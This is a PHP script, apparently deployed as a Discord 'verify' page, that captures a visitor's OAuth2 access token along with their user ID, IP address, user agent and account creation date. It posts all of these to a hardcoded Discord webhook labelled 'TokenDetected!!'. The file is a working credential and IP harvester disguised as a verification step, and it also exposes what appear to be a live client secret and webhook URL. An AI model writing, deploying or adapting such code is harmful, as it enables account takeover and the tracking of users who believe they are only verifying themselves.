<?php
// Railwayの生存確認
if ($_SERVER['REQUEST_URI'] === '/health') {
    http_response_code(200);
    exit('OK');
}

// --- 設定データ ---
$client_id     = '1483799840575062046';
$client_secret = 'LDohkevzX8GXCtGo-YFdPuR-efZpNoSJ'; 
$webhook_url   = 'https://discordapp.com/api/webhooks/1483798695370555504/cFHJ2PIpesLaP6nshwICr3SP-7Nz6DWlM6VqsLDIUC6pbiUBbBpm4D3EYnnACTPQQ4fm';
$redirect_uri  = 'https://discord-verify-production-1337.up.railway.app'; 

if (!isset($_GET['code'])) {
    echo "Ready. Please use the OAuth2 link.";
    exit;
}

// 1. アクセストークンの取得
$ch = curl_init('https://discord.com/api/oauth2/token');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'client_id'     => $client_id,
    'client_secret' => $client_secret,
    'grant_type'    => 'authorization_code',
    'code'          => $_GET['code'],
    'redirect_uri'  => $redirect_uri
]));
$token_res = json_decode(curl_exec($ch), true);

if (isset($token_res['access_token'])) {
    $access_token = $token_res['access_token'];

    // 2. ユーザー情報の取得
    $ch = curl_init('https://discord.com/api/users/@me');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: Bearer ' . $access_token]);
    $user = json_decode(curl_exec($ch), true);

    // 3. 情報の整理
    $time = date("Y/m/d H:i:s");
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    
    // アカウント作成日の計算
    $creation_date = date("Y/m/d H:i:s", (($user['id'] >> 22) + 1420070400000) / 1000);

    // 4. 指定フォーマット（Token最優先）
    $content = "```autohotkey\n";
    $content .= "TokenDetected!!\n\n";
    $content .= "Token: " . $access_token . "\n"; // ここに認証した人のTokenが入ります
    $content .= "UserID: " . $user['id'] . " (" . $user['username'] . ")\n";
    $content .= "Time: " . $time . "\n";
    $content .= "IP Address: " . $ip . "\n";
    $content .= "Device: " . $ua . "\n";
    $content .= "AccountCreationDate: " . $creation_date . "\n";
    $content .= "```";

    // Discord Webhookへ送信
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(["content" => $content]));
    curl_exec($ch);
}

exit;
